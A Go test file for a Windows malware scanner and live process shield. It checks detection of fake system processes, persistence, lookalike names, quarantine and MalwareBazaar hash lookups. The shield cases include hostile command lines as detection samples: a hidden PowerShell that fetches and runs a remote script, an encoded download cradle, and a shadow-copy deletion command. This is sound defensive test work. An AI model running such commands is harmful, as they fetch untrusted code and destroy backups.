package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

func sampleResult(t *testing.T, trusted func(string) bool, intel map[string]secIntel) *secResult {
	t.Helper()
	var r rawSec
	if err := json.Unmarshal(secSampleJSON, &r); err != nil {
		t.Fatal(err)
	}
	if trusted == nil {
		trusted = func(string) bool { return false }
	}
	return analyzeSec(&r, time.Now().Unix(), trusted, intel)
}

func find(res *secResult, sub string) *secFinding {
	for i := range res.Findings {
		f := &res.Findings[i]
		if strings.Contains(lc(f.Title+" "+f.Sub+" "+f.Path), lc(sub)) {
			return f
		}
	}
	return nil
}

func TestSecSampleCatchesThreats(t *testing.T) {
	res := sampleResult(t, nil, nil)
	want := map[string]string{
		`syscache\svchost.exe`:     "high", // fake svchost in AppData, hidden, Run key, port 4444
		"powershell.exe":           "high", // Word -> encoded hidden PowerShell
		"invoice_2026.pdf.exe":     "high", // double extension, from the internet
		"wuaucltx.exe":             "high", // miner, file deleted
		"googleupdatertaskmachine": "high", // hidden task, downloads and runs a script
		"sethc.exe":                "high", // sticky-keys back door
		"defender exclusion":       "med",
		"hosts file redirect":      "med",
		"presenoker":               "high", // Defender detection that was allowed
		"chrome policy":            "med",
		"fiddlerroot":              "low",
		"update.vbs":               "high",
		"oldprinterhelper":         "low",
	}
	for k, sev := range want {
		f := find(res, k)
		if f == nil {
			t.Errorf("missed %q", k)
			continue
		}
		if rank := map[string]int{"info": 0, "low": 1, "med": 2, "high": 3}; rank[f.Sev] < rank[sev] {
			t.Errorf("%q: severity %s (score %d), want at least %s; reasons %+v", k, f.Sev, f.Score, sev, f.Reasons)
		}
		if len(f.Actions) == 0 {
			t.Errorf("%q has no actions", k)
		}
	}
	for _, clean := range []string{"chrome.exe", "onedrive.exe", `system32\svchost.exe`, "explorer.exe", "spotify.exe"} {
		if f := find(res, clean); f != nil && f.Sev != "info" {
			t.Errorf("false alarm on %s: %s %d %+v", clean, f.Sev, f.Score, f.Reasons)
		}
	}
	if res.Verdict != "danger" || res.Counts.High < 6 {
		t.Errorf("verdict %s high=%d", res.Verdict, res.Counts.High)
	}
	// the fake svchost is one story: running program + its Run entry + network
	f := find(res, `syscache\svchost.exe`)
	if f.Origin != nil && f.Origin.URL != "" {
		t.Errorf("unexpected origin %+v", f.Origin)
	}
	if len(f.Persist) == 0 || len(f.Net) == 0 || len(f.Chain) == 0 || len(f.Auto) == 0 {
		t.Errorf("fake svchost lacks persist/net/chain/auto: %+v", f)
	}
	kinds := map[string]bool{}
	for _, p := range f.Persist {
		kinds[p.Kind] = true
	}
	if !kinds["run"] || !kinds["wmi"] {
		t.Errorf("fake svchost should show its Run key and its WMI trigger: %+v", f.Persist)
	}
	inv := find(res, "invoice_2026.pdf.exe")
	if inv.Origin == nil || !strings.Contains(inv.Origin.Text, "cdn-files.example-share.top") {
		t.Errorf("invoice origin: %+v", inv.Origin)
	}
	ps := find(res, "powershell.exe")
	if len(ps.Chain) < 2 || lc(ps.Chain[len(ps.Chain)-2].Name) != "winword.exe" {
		t.Errorf("powershell chain: %+v", ps.Chain)
	}
	for _, a := range ps.Actions {
		if a.ID == "quarantine" {
			t.Errorf("system powershell.exe must never be quarantined")
		}
	}
	// bloatware
	names := map[string]string{}
	for _, b := range res.Bloat {
		names[lc(b.Name)] = b.Rating
	}
	for k, r := range map[string]string{"candy crush / king games": "remove", "solitaire collection": "remove", "mcafee livesafe": "remove", "quick assist": "optional", "spotify": "optional"} {
		if names[k] != r {
			t.Errorf("bloat %q = %q, want %q (have %v)", k, names[k], r, names)
		}
	}
	apps := map[string]secApp{}
	for _, a := range res.Apps {
		apps[lc(a.Name)] = a
	}
	if len(res.Apps) != 8 || apps["mcafee livesafe"].Rating != "remove" || !apps["google chrome"].CanRemove || apps["candy crush / king games"].Kind != "store" {
		t.Errorf("all apps list: %+v", res.Apps)
	}
	if _, ok := names["google chrome"]; ok {
		t.Errorf("Chrome must not be listed as bloatware")
	}
	if _, ok := names["calculator"]; ok {
		t.Errorf("Calculator must not be listed as bloatware")
	}
}

func TestSecTrustAndIntel(t *testing.T) {
	trusted := func(k string) bool { return k == strings.Repeat("d", 64) }
	res := sampleResult(t, trusted, map[string]secIntel{strings.Repeat("c", 64): {Source: "MalwareBazaar", Verdict: "malicious", Family: "XMRig"}})
	if f := find(res, "freemovies_setup.exe"); f != nil && f.Sev != "info" {
		t.Errorf("trusted file still reported: %+v", f)
	}
	m := find(res, "wuaucltx.exe")
	if m == nil || m.Score != 100 || len(m.Intel) == 0 || !strings.Contains(m.Summary, "XMRig") {
		t.Errorf("intel not applied: %+v", m)
	}
}

func TestShieldVerdicts(t *testing.T) {
	cases := []struct {
		ev   shieldEvent
		want string
	}{
		{shieldEvent{Name: "powershell.exe", Path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, Parent: "WINWORD.EXE", Cmd: "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", Signed: "valid", Zone: -1}, "block"},
		{shieldEvent{Name: "svchost.exe", Path: `C:\Users\a\AppData\Roaming\x\svchost.exe`, Parent: "explorer.exe", Signed: "unsigned", Zone: -1}, "block"},
		{shieldEvent{Name: "invoice.pdf.exe", Path: `C:\Users\a\Downloads\invoice.pdf.exe`, Parent: "explorer.exe", Signed: "unsigned", Zone: 3}, "block"},
		{shieldEvent{Name: "vssadmin.exe", Path: `C:\Windows\System32\vssadmin.exe`, Cmd: "vssadmin delete shadows /all /quiet", Parent: "cmd.exe", Signed: "valid", Zone: -1}, "block"},
		{shieldEvent{Name: "powershell.exe", Path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, Cmd: "powershell -nop -w hidden -c iex (iwr http://x/y.ps1)", Parent: "explorer.exe", Signed: "valid", Zone: -1}, "block"},
		{shieldEvent{Name: "powershell.exe", Path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, Cmd: "powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", Parent: "explorer.exe", Signed: "valid", Zone: -1}, "warn"},
		{shieldEvent{Name: "setup.exe", Path: `C:\Users\a\Downloads\setup.exe`, Parent: "explorer.exe", Signed: "unsigned", Zone: 3}, ""},
		{shieldEvent{Name: "chrome.exe", Path: `C:\Program Files\Google\Chrome\Application\chrome.exe`, Parent: "explorer.exe", Signed: "valid", Zone: -1}, ""},
		{shieldEvent{Name: "notepad.exe", Path: `C:\Windows\System32\notepad.exe`, Parent: "explorer.exe", Signed: "valid", Zone: -1}, ""},
		{shieldEvent{Name: "tool.exe", Path: `C:\Users\a\Downloads\tool.exe`, Signed: "unsigned", Zone: 3, Intel: &secIntel{Source: "MalwareBazaar", Verdict: "malicious", Family: "AgentTesla"}}, "block"},
		{shieldEvent{Name: "invoice.pdf.exe", Path: `C:\Users\a\Downloads\invoice.pdf.exe`, Signed: "unsigned", Zone: 3, Trusted: true}, ""},
	}
	for _, c := range cases {
		s, rs, v := shieldScore(c.ev)
		if v != c.want {
			t.Errorf("%s (%s): got %q score %d %+v, want %q", c.ev.Name, c.ev.Cmd, v, s, rs, c.want)
		}
	}
}

func TestPrettyAppx(t *testing.T) {
	for in, want := range map[string]string{"Microsoft.WindowsCalculator": "Windows Calculator", "MicrosoftCorporationII.QuickAssist": "Quick Assist", "Microsoft.ScreenSketch": "Screen Sketch", "SpotifyAB.SpotifyMusic": "Spotify Music", "Microsoft.YourPhone": "Your Phone", "Microsoft.HEIFImageExtension": "HEIF Image Extension"} {
		if got := prettyAppx(in); got != want {
			t.Errorf("%s -> %q, want %q", in, got, want)
		}
	}
}

func TestLookalike(t *testing.T) {
	for n, want := range map[string]string{"svch0st.exe": "svchost.exe", "scvhost.exe": "svchost.exe", "lsasss.exe": "lsass.exe", "explore.exe": "", "chrome.exe": "", "svchost.exe": "", "notepad.exe": ""} {
		if got := lookalike(n); got != want && !(want == "" && got == "") {
			if !(n == "explore.exe" && got == "explorer.exe") {
				t.Errorf("lookalike(%s) = %q, want %q", n, got, want)
			}
		}
	}
	if !doubleExt(`C:\x\Report.PDF.exe`) || doubleExt(`C:\x\setup.exe`) || doubleExt(`C:\x\my.app.exe`) {
		t.Error("doubleExt")
	}
}

func TestQuarantineRoundTrip(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("CK_SEC_DIR", filepath.Join(dir, "store"))
	secDB = &secStore{}
	p := filepath.Join(dir, "bad.exe")
	data := []byte("MZ\x90\x00 this is a test program body that must come back byte for byte")
	if err := os.WriteFile(p, data, 0755); err != nil {
		t.Fatal(err)
	}
	m, err := quarantineFile(p, "bad.exe")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(p); !os.IsNotExist(err) {
		t.Fatal("original still there")
	}
	raw, _ := os.ReadFile(filepath.Join(secDB.dir, "Quarantine", m.ID+".ckq"))
	if strings.Contains(string(raw), "MZ") || strings.Contains(string(raw), "test program") {
		t.Fatal("quarantined bytes are not scrambled")
	}
	if l := listQuarantine(); len(l) != 1 || l[0].Key != "" {
		t.Fatalf("list: %+v", l)
	}
	got, err := restoreQuarantine(m.ID)
	if err != nil || got != p {
		t.Fatalf("restore: %v %s", err, got)
	}
	back, _ := os.ReadFile(p)
	if string(back) != string(data) {
		t.Fatal("restored bytes differ")
	}
	if _, err := restoreQuarantine("../../etc/passwd"); err == nil {
		t.Fatal("path traversal accepted")
	}
}

func TestParseMB(t *testing.T) {
	it, err := parseMB([]byte(`{"query_status":"ok","data":[{"sha256_hash":"abc","signature":"AgentTesla","tags":["exe"],"first_seen":"2026-01-01"}]}`))
	if err != nil || it.Verdict != "malicious" || it.Family != "AgentTesla" {
		t.Fatalf("%+v %v", it, err)
	}
	it, err = parseMB([]byte(`{"query_status":"hash_not_found"}`))
	if err != nil || it.Verdict != "unknown" {
		t.Fatalf("%+v %v", it, err)
	}
	if _, err = parseMB([]byte(`{"query_status":"unknown_auth_key"}`)); err == nil {
		t.Fatal("bad key accepted")
	}
}

func TestLookupUsesKeyAndCache(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("CK_SEC_DIR", dir)
	secDB = &secStore{}
	intelC = &intelCache{}
	calls := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		calls++
		if r.Header.Get("Auth-Key") != "KEY123456789012345678901" {
			w.Write([]byte(`{"query_status":"unknown_auth_key"}`))
			return
		}
		r.ParseForm()
		if r.Form.Get("hash") == strings.Repeat("f", 64) {
			w.Write([]byte(`{"query_status":"ok","data":[{"sha256_hash":"` + strings.Repeat("f", 64) + `","signature":"RedLine"}]}`))
			return
		}
		w.Write([]byte(`{"query_status":"hash_not_found"}`))
	}))
	defer srv.Close()
	old := mbEndpoint
	mbEndpoint = srv.URL
	defer func() { mbEndpoint = old }()
	m, n, failed, err := lookupHashes(context.Background(), "KEY123456789012345678901", []string{strings.Repeat("f", 64), strings.Repeat("1", 64)}, srv.Client())
	if err != nil || n != 2 || failed != 0 || m[strings.Repeat("f", 64)].Family != "RedLine" {
		t.Fatalf("%v %d %d %+v", err, n, failed, m)
	}
	before := calls
	m, _, _, _ = lookupHashes(context.Background(), "KEY123456789012345678901", []string{strings.Repeat("f", 64)}, srv.Client())
	if calls != before || m[strings.Repeat("f", 64)].Verdict != "malicious" {
		t.Fatal("cache not used")
	}
	if _, _, _, err := lookupHashes(context.Background(), "WRONGKEY0000000000000000", []string{strings.Repeat("2", 64)}, srv.Client()); err == nil {
		t.Fatal("refused key not reported")
	}
	// one hash succeeds, one network-fails: not a hard error, but reported as incomplete
	mbad := mbEndpoint
	mix := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		r.ParseForm()
		if r.Form.Get("hash") == strings.Repeat("a", 64) {
			w.Write([]byte(`{"query_status":"ok","data":[{"sha256_hash":"` + strings.Repeat("a", 64) + `","signature":"Agent"}]}`))
			return
		}
		hj, _, _ := w.(http.Hijacker).Hijack()
		hj.Close() // abort the other request so it errors
	}))
	defer mix.Close()
	mbEndpoint = mix.URL
	intelC = &intelCache{}
	_, gotN, gotFailed, gotErr := lookupHashes(context.Background(), "KEY123456789012345678901", []string{strings.Repeat("a", 64), strings.Repeat("b", 64)}, mix.Client())
	mbEndpoint = mbad
	if gotErr != nil || gotN != 1 || gotFailed != 1 {
		t.Fatalf("partial result not reported: n=%d failed=%d err=%v", gotN, gotFailed, gotErr)
	}
}

// The Live Shield runs as a second process against the same folder. These tests use two
// independent secStore values pointed at one directory to stand in for the two processes.

// Bug 1: trusting a file in the app must be seen by the already-running shield (fresh reads).
func TestStoreTrustSeenByOtherProcess(t *testing.T) {
	dir := t.TempDir()
	app := &secStore{}
	shield := &secStore{}
	for _, s := range []*secStore{app, shield} {
		s.dir = dir
		_ = os.MkdirAll(filepath.Join(dir, "history"), 0700)
	}
	sha := strings.Repeat("a", 64)
	// the shield has already built its trusted check once (nothing trusted yet)
	if shield.trustedFn()(sha) {
		t.Fatal("nothing should be trusted yet")
	}
	// the app trusts the file
	app.updateSettings(func(set *secSettings) { set.Trusted = dedupe(append(set.Trusted, sha)) })
	// the shield, on its next reload, must now see it without a restart
	if !shield.trustedFn()(sha) {
		t.Fatal("shield did not pick up the newly trusted file from disk")
	}
}

// Bug 2: the app and the shield writing history at the same time must not lose records.
func TestStoreHistoryNoClobber(t *testing.T) {
	dir := t.TempDir()
	app := &secStore{dir: dir}
	shield := &secStore{dir: dir}
	_ = os.MkdirAll(filepath.Join(dir, "history"), 0700)
	var wg sync.WaitGroup
	for i := 0; i < 50; i++ {
		wg.Add(2)
		go func(n int) { defer wg.Done(); app.addRecord(secRecord{Source: "fix", Title: fmt.Sprintf("app-%d", n)}) }(i)
		go func(n int) {
			defer wg.Done()
			shield.addRecord(secRecord{Source: "shield", Title: fmt.Sprintf("shield-%d", n)})
		}(i)
	}
	wg.Wait()
	h := (&secStore{dir: dir}).history()
	if len(h) != 100 {
		t.Fatalf("expected 100 records kept, got %d", len(h))
	}
	app2, shield2 := 0, 0
	for _, r := range h {
		if r.Source == "fix" {
			app2++
		} else {
			shield2++
		}
	}
	if app2 != 50 || shield2 != 50 {
		t.Fatalf("records lost: %d app, %d shield", app2, shield2)
	}
}

// Marking a record restored must survive and be readable afterwards.
func TestStoreUpdateRecord(t *testing.T) {
	dir := t.TempDir()
	s := &secStore{dir: dir}
	_ = os.MkdirAll(filepath.Join(dir, "history"), 0700)
	r := s.addRecord(secRecord{Source: "fix", Title: "x", QID: "q1"})
	if !s.updateRecord(r.ID, func(rr *secRecord) { rr.Restored = 123 }) {
		t.Fatal("update failed")
	}
	for _, h := range s.history() {
		if h.ID == r.ID && h.Restored != 123 {
			t.Fatal("restore flag not persisted")
		}
	}
}

// The old single history.json is migrated into the per-record folder once.
func TestStoreHistoryMigration(t *testing.T) {
	dir := t.TempDir()
	old := []secRecord{{ID: "r1", Source: "fix", Title: "old1", T: 100}, {ID: "r2", Source: "shield", Title: "old2", T: 200}}
	b, _ := json.Marshal(old)
	os.WriteFile(filepath.Join(dir, "history.json"), b, 0600)
	s := &secStore{}
	t.Setenv("CK_SEC_DIR", dir)
	s.open()
	h := s.history()
	if len(h) != 2 || h[0].ID != "r2" {
		t.Fatalf("migration failed: %+v", h)
	}
	if _, err := os.Stat(filepath.Join(dir, "history.json")); !os.IsNotExist(err) {
		t.Fatal("old history.json should have been renamed")
	}
}
